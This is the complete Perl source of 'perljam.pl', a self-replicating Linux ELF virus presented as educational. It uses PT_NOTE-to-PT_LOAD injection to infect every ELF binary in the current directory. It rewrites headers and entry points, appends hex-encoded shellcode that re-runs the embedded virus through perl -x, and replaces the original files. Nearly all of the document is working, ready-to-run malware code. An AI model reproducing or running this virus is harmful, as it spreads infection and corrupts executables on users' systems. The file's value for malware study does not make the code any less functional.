#!/usr/bin/perl
# perljam.pl
# written by isra - isra _replace_by_@_ fastmail.net - https://hckng.org
#
# https://hckng.org/articles/perljam-elf64-virus.html
# https://git.sr.ht/~hckng/vx/tree/master/item/perljam.pl
# https://github.com/ilv/vx/blob/main/perljam.pl
# 
# version 0.2 - 04.08.2023
#
# A Perl x64 ELF virus:
# - implementation of PT_NOTE -> PT_LOAD injection technique for x64 ELFs
# - works on position independent executables
# - it injects a hardcoded payload
# - infects files in current directory, non-recursively
# - self-replicant
#
# run as follows:
# - perl perljam.pl
#
# the payload prints to stdout an extract from the song "release" by Pearl Jam 
# and then replicates the virus by running perljam.pl source code embedded
# in the infected binary
#
# to do:
# - more testing, currently tested on:
# 	- Debian 11/12 x86_64, Perl v5.32.1
#
# perljam.pl was made for educational purposes only, I'm not responsible
# for any misuse or damage caused by this program. Use it at your own risk.
#
# thanks to tmp0ut and vxug for all the resources
# 
#
# main references:
# - https://www.guitmz.com/linux-midrashim-elf-virus/
# - https://www.symbolcrash.com/2019/03/27/pt_note-to-pt_load-injection-in-elf/
# - https://tmpout.sh/1/3.html
# - https://tmpout.sh/1/2.html
#

use strict;
use integer;
use File::Copy;

# read & unpack
sub ru {
	my $fh  = shift;
	my $tpl = shift;
	my $sz  = shift;

	read $fh, my $buff, $sz;
	return unpack($tpl, $buff);
}

# write & pack
sub wp {
	my $fh   = shift;
	my $tpl  = shift;
	my $sz   = shift;
	my @data = @_;

	syswrite $fh, pack($tpl, @data), $sz;
}

#
# payload
#
# prints "i am myself, like you somehow", then executes the infected binary
# as a perl script to achieve replication (/usr/bin/perl -x infected_binary)
#
# payload needs to be splitted in two: before and after the "infected_binary"
# parameter in '/usr/bin/perl -x infected_file'; this allow us to adjust the
# payload on-the-fly by adding the hexadecimal representation of the infected
# binary's filename
#
# for more details check https://hckng.org/articles/perljam 

my ($payload_prefix, $payload_suffix);
$payload_prefix  = "\xe8\x30\x01\x00\x00\x69\x20\x61\x6d\x20\x6d\x79\x73\x65";
$payload_prefix .= "\x6c\x66\x2c\x20\x6c\x69\x6b\x65\x20\x79\x6f\x75\x20\x73";
$payload_prefix .= "\x6f\x6d\x65\x68\x6f\x77\x0a\x00\x2f\x75\x73\x72\x2f\x62";
$payload_prefix .= "\x69\x6e\x2f\x70\x65\x72\x6c\x00\x2d\x78\x00";

$payload_suffix  = "\x00\x48\x31\xc0\x48\x31\xd2\xfe\xc0\x48\x89\xc7\x5e\xb2";
$payload_suffix .= "\x1e\x0f\x05\x48\x31\xc0\xb8\x39\x00\x00\x00\x0f\x05\x85";
$payload_suffix .= "\xc0\x75\x2f\x48\x8d\x7e\x1f\x48\x31\xd2\x52\x48\x8d\x5e";
$payload_suffix .= "\x30\x53\x48\x8d\x5e\x2d\x53\x57\x48\x89\xe6\x48\x31\xc0";
$payload_suffix .= "\xb8\x3b\x00\x00\x00\xba\x00\x00\x00\x00\x0f\x05\x48\x31";
$payload_suffix .= "\xd2\xb8\x3c\x00\x00\x00\x0f\x05\x48\x31\xc0\x48\x31\xd2";

# size is length of prefix + suffix + max length of filename on Linux
my $payload_sz = 0;
$payload_sz += length($payload_prefix);
$payload_sz += length($payload_suffix);
$payload_sz += 255;

#
# virus code
#
# search for '#!/usr/bin/perl' first to avoid copying extra data
my $vx;
open my $fh_vx, '<', $0;
while(<$fh_vx>) {
	last if($_ =~ q(#!/usr/bin/perl));
}
$vx  = "#!/usr/bin/perl\n";
$vx .= $_ while(<$fh_vx>);
close $fh_vx;
# virus size
my $vx_sz = length($vx);

# loop current directory
foreach my $file(glob qq{"./*"}) {
	# files only
	next if(!-f $file);
	open my $fh, '<:raw', $file;

	# file size
	my $file_sz = (stat $file)[7];

	# original and new entry points
	my ($oe_entry, $ne_entry);

	#
	# read ELF header
	# see https://refspecs.linuxfoundation.org/elf/gabi4+/ch4.eheader.html
	my @ehdr = ru($fh, "C a a a C C C C C x7 S S I q q q I S S S S S S", 0x40);

	# for clarity
	my ($e_phoff, $e_phentsize, $e_phnum) = ($ehdr[13], $ehdr[17], $ehdr[18]);

	# skip non ELFs
	# $ehdr[i]  = ei_magi, 0 <= i <= 3
	if($ehdr[0] != 127 && $ehdr[1] !~ "E" && $ehdr[2] !~ "L" && $ehdr[3] !~ "F") {
		close $fh;
		next;
	}

	# check if binary has already been infected
	my $infected = 0;
	open my $fh_check, '<:raw', $file;
	while(<$fh_check>) {
		if($_ =~ q(#!/usr/bin/perl)) {
			$infected++;
			last;
		}
	}
	# skip infected files
	if($infected) {
		close $fh;
		close $fh_check;
		next;
	}

	# change entry point ($ehdr[11] = e_entry)
	# new entry point: far away address + binary size
	my $far_addr = 0xc000000;
	$ne_entry = $far_addr + $file_sz;
	$oe_entry = $ehdr[12];
	$ehdr[12] = $ne_entry;

	# create tmp file for copying the modified binary
	open my $fh_tmp, '>:raw', "$file.tmp";
	wp($fh_tmp, "C a a a C C C C C x7 S S I q q q I S S S S S S", 0x40, @ehdr);

	seek $fh, $e_phoff, "SEEK_SET";
	seek $fh_tmp, $e_phoff, "SEEK_SET";

	# inject the first PT_NOTE segment found
	my $found_ptnote = 0;
	for (my $i = 0; $i < $e_phnum; $i++) {
		#
		# read program header
		# see https://refspecs.linuxbase.org/elf/gabi4+/ch5.pheader.html
		my @phdr = ru($fh, "I I q q q q q q", $e_phentsize);

		# PT_NOTE segment found
		if($phdr[0] == 0x00000004 && !$found_ptnote) {
			$found_ptnote = 1;

			# change PT_NOTE to PT_LOAD (p_type)
			$phdr[0] = 0x00000001;
			# make the new PT_LOAD segment executable (p_flags)
			$phdr[1] = 0x5;
			# change offset to end of infected file (p_offset)
			$phdr[2] = $file_sz;
			# change virtual address to the new entry point (p_vaddr)
			$phdr[3] = $ne_entry;
			# change p_filesz and p_memsz (add payload size + jmp + vx size)
			$phdr[5] += $payload_sz + 5 + $vx_sz;
			$phdr[6] += $payload_sz + 5 + $vx_sz;
			# align 2mb (p_align)
			$phdr[7] = 0x200000;
		}
		wp($fh_tmp, "I I q q q q q q", $e_phentsize, @phdr);
	}

	# copy rest of binary's content
	syswrite $fh_tmp, $_ while(<$fh>);

	#
	# append payload
	#
	syswrite $fh_tmp, $payload_prefix;
	# adjust payload with infected binary's filename
	my @chars = split //, $file;
	for(my $i = 0; $i < length($file); $i++) {
		wp($fh_tmp, "C", 0x1, (hex unpack("H2", $chars[$i])));
	} 
	# fill with null values
	for(my $i = length($file); $i < 255; $i++) {
		wp($fh_tmp, "C", 0x1, (0x00));
	}
	syswrite $fh_tmp, $payload_suffix;

	#
	# append relative jmp
	#
	# the relative entry point for jumping back to the binary's original
        # code is calculated using the formula described in Linux.Midrashim:
	#
	# newEntryPoint = originalEntryPoint - (phdr.vaddr+5) - virus_size
	#
	$ne_entry = $oe_entry - ($ne_entry + 5) - $payload_sz;
	# 4 bytes only
	$ne_entry = $ne_entry & 0xffffffff;
	wp($fh_tmp, "C q", 0x9, (0xe9, $ne_entry));

	# for -no-pie you can use mov rax, jmp rax with the original entry point
	#syswrite $fh_tmp, pack("C C q C C", 0x48, 0xb8, $e_entry, 0xff, 0xe0);

	#
	# append virus code
	#
	syswrite $fh_tmp, "\n".$vx;

	close $fh;
	close $fh_tmp;

	# replace original binary with tmp copy
	unlink $file;
	copy("$file.tmp", $file);
	unlink "$file.tmp";
	chmod 0755, $file;
}
